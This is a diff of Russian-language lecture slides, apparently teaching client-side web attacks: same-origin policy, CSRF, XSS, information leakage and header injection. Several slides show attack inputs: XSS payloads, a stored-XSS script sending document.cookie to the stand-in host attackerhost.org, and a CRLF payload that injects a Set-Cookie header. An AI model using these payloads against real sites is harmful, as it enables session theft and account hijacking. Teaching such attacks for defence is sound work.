@@ -14,17 +14,41 @@
 	<script type="text/javascript" src="highlight.min.js"></script>
 	<script>hljs.initHighlightingOnLoad();</script>
 </head>
-<body data-duration="10">
+<body data-duration="30">
 
 <header id="intro" class="slide">
 </header>
 <section>
 	<header class="slide">
-		<h1>Введение</h1>
+		<h1>0. Введение</h1>
 	</header>
-	
+
 	<section class="slide" title="">
-		<h2>Same-origin policy (SOP)</h2>
+		<h2>0.1 Немного о безопасности веб-приложений</h2>
+		<ul>
+			<li class="delayed emptyli"><p>клиентские атаки часто ориентированы непосредственно на пользователя</p></li>
+			<li class="delayed emptyli">
+                <p>нужно заставить другого человека произвести определенные действия</p>
+                <ul>
+                    <li class="delayed">перейти по определенной ссылке</li>
+                    <li class="delayed">просмотреть комментарий</li>
+                    <li class="delayed">ввести какие-либо данные</li>
+                </ul>
+            </li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>0.2 Статистика <a href="http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf">Positive Technologies</a></h2>
+		<ul>
+			<li class="delayed emptyli"><span class="red twoem">23%</span> Cross-Site Request Forgery (Межсайтовая подделка запроса)</li>
+			<li class="delayed emptyli"><span class="red twoem">50%</span> Information Leakage (Утечка информации)</li>
+			<li class="delayed emptyli"><span class="red twoem">80%</span> Cross-Site Scripting (Межсайтовый скриптинг)</li>
+		</ul>
+	</section>
+
+	<section class="slide" title="">
+		<h2>0.3 Same-origin policy (SOP)</h2>
 		<p class="delayed twoem">site.com</p>
 		<ul>
 			<li class="delayed redli">http://<span class="red">www</span>.site.com</li>
@@ -32,20 +56,11 @@
 			<li class="delayed redli">http<span class="red">s</span>://site.com</li>
 			<li class="delayed redli">http://site.com:<span class="red">8080</span></li>
 		</ul>
+		<p class="delayed">обход SOP и является целью большинства клиентских атак</p>
 	</section>
 	
 	<section class="slide">
-		<h2>статистика<br><a href="http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf">Positive Technologies</a></h2>
-		<ul>
-			<li class="delayed emptyli"> Cross-Site Request Forgery <span class="red twoem">23%</span></li>
-			<li class="delayed emptyli">Information Leakage <span class="red twoem">50%</span></li>
-			<li class="delayed emptyli">Cross-Site Scripting <span class="red twoem">80%</span></li>
-		</ul>
-	</section>
-	
-	<section class="slide" id="navigation">
-		<h2>Примеры (CSRF)</h2>
-		
+		<h2>0.4.1 CSRF</h2>
 		<ul>
 			<li class="delayed emptyli">
 				GET:
@@ -59,11 +74,79 @@
 			</li>
 		</ul>
 	</section>
+
+	<section class="slide">
+		<h2>0.4.2 XSS</h2>
+		<p>Cross Site Scripting (межсайтовый скриптинг).</p>
+		<p>Ошибка валидации пользовательских данных, которая позволяет передать JavaScript код на исполнение в браузер пользователя.</p>
+		<p class="delayed">HTML-Injection</p>
+	</section>
+
+	<section class="slide">
+		<h2>0.4.2 XSS:reflected (отраженные)</h2>
+		<ul>
+			<li class="delayed emptyli">
+				<pre class="delayed"><code>http://www.site.com/page.php?var=&lt;script&gt;alert('xss');&lt;/script&gt;</code></pre>
+			</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>0.4.2 XSS:stored (хранимые)</h2>
+		<ul>
+			<li class="delayed emptyli">
+				<pre class="delayed"><code class="javascript">var іmg = new Image();<br>іmg.srс = 'http://attackerhost.org/xss?' + document.cookie;</code></pre>
+			</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>0.4.2 XSS:dom-base</h2>
+		<ul>
+			<li class="delayed emptyli">
+				<pre><code>http://site.com/index.html?&lt;script&gt;alert('xss')&lt;/script&gt;</code></pre>
+				<pre><code class="html">&lt;script&gt;<br />    document.write(unescape(documant.location.href);<br />&lt;/script&gt;</code></pre>
+			</li>
+			<li class="delayed emptyli">
+				<pre><code class="html">&lt;form onsubmit="document.write(this.t.value)"&gt;<br />  &lt;input type='text' id = 't'&gt;<br /> &lt;/form&gt;</code></pre>
+			</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>0.4.2 XSS WARNING!</h2>
+		<ul class="delayed">
+			<li class="emptyli"><pre><code class="javascript">document.write()</code></pre></li>
+			<li class="emptyli"><pre><code class="javascript">document.writeln()</code></pre></li>
+			<li class="emptyli"><pre><code class="javascript">eval()</code></pre></li>
+			<li class="emptyli"><pre><code class="javascript">.innerHTML</code></pre></li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>0.4.3 Information Leakage</h2>
+		<ul class="delayed">
+			<li class="emptyli">Закоментированные участки кода.</li>
+			<li class="emptyli">Незакрытые устаревшие API</li>
+			<li class="emptyli">Данные не спрятанные за аутентификацию</li>
+		</ul>
+	</section>
+
+	<section class="slide">
+		<h2>0.4.4 Header Injection & Session Fixation</h2>
+		<ul>
+			<li class="delayed emptyli"><pre><code>http://test.com?jump={user input}</code></pre></li>
+			<li class="delayed emptyli"><pre><code>...<br/>Location: {user input}<br/>...</code></pre></li>
+			<li class="delayed emptyli"><pre><code>http://test.com?jump=hell%0d%0aSet-Cookie: gotohell	%3d1</code></pre></li>
+			<li class="delayed emptyli"><pre><code>...<br/>Location: hell<br/>Set-Cookie = 1<br/>...</code></pre></li>
+		</ul>
+	</section>
+
 </section>
 
 
 <footer class="slide" title="The End">
-	<h2>Thank you!</h2>
+	<h2>Спасибо за внимание!</h2>
 </footer>
 
 <script src="slideshow.js"></script>
